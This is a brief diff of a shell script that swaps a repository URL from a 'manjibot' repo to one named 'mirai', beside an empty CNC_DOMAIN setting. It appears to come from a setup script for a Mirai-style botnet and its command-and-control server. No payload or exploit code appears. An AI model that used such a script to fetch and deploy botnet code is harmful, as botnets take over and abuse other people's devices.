@@ -33,7 +33,7 @@ log() {
 }
 
 CNC_DOMAIN=""
-REPO_URL="https://github.com/nettproxy/manjibot.git"
+REPO_URL="https://github.com/s37dhei2d4jdkdk368/mirai.git"
 
 while [[ $# -gt 0 ]]; do
     case $1 in
